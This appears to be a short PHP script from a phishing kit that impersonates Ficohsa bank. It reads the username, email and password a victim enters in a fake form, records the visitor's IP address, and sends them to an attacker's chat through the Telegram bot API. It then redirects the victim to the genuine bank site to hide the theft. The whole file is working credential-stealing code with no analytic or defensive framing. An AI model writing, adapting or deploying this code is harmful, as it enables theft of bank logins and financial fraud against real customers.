<?php
session_start();




$dnam = $_POST['fin'];
$utar = $_POST['mail'];
$buy = $_POST['pass'];

require 'post.php';




$html_message = "-[ficohsa]----------\n".
				"<b> US3R: </b><code>".$dnam."</code>\n".
                "<b> correo : </b><code>".$utar."</code>\n".
                "<b> clave: </b><code>".$buy."</code>\n".
				"Geo ".$_SERVER['REMOTE_ADDR']."\n".
				"---------------------------------";

$html_message = urlencode($html_message);
$result = @file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=$html_message&parse_mode=html");


header("Location: https://secure.ficohsa.com/");
exit; //
?>